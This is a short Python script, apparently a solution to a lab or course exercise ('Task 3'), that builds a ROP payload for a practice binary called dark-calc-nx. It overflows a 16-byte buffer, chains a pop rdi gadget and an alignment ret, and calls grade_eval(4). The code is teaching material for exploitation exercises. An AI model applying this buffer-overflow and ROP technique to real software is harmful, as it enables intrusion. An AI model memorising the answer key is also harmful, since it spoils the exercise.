#!/usr/bin/env python3
"""Task 3: ROP on dark-calc-nx.

The stack is non-executable and randomised.  We use the accidental
`pop rdi; ret` gadget at 0x401a33 (the second byte of `pop r15; ret` in
__libc_csu_init) to load the argument 4, then a bare `ret` (0x401a34)
to satisfy the 16-byte stack alignment that printf() requires, and
finally enter grade_eval at 0x401978.
"""
import struct
import sys

p64 = lambda x: struct.pack("<Q", x)

POP_RDI = 0x401A33
RET     = 0x401A34
GRADE   = 0x401978

payload  = b"A" * 16                  # expression[16]
payload += p64(0x4141414141414141)    # saved rbp (unused)
payload += p64(POP_RDI)               # pop rdi ; ret
payload += p64(4)                     # grade == 4
payload += p64(RET)                   # align rsp for printf()
payload += p64(GRADE)                 # grade_eval(4)

sys.stdout.buffer.write(payload)
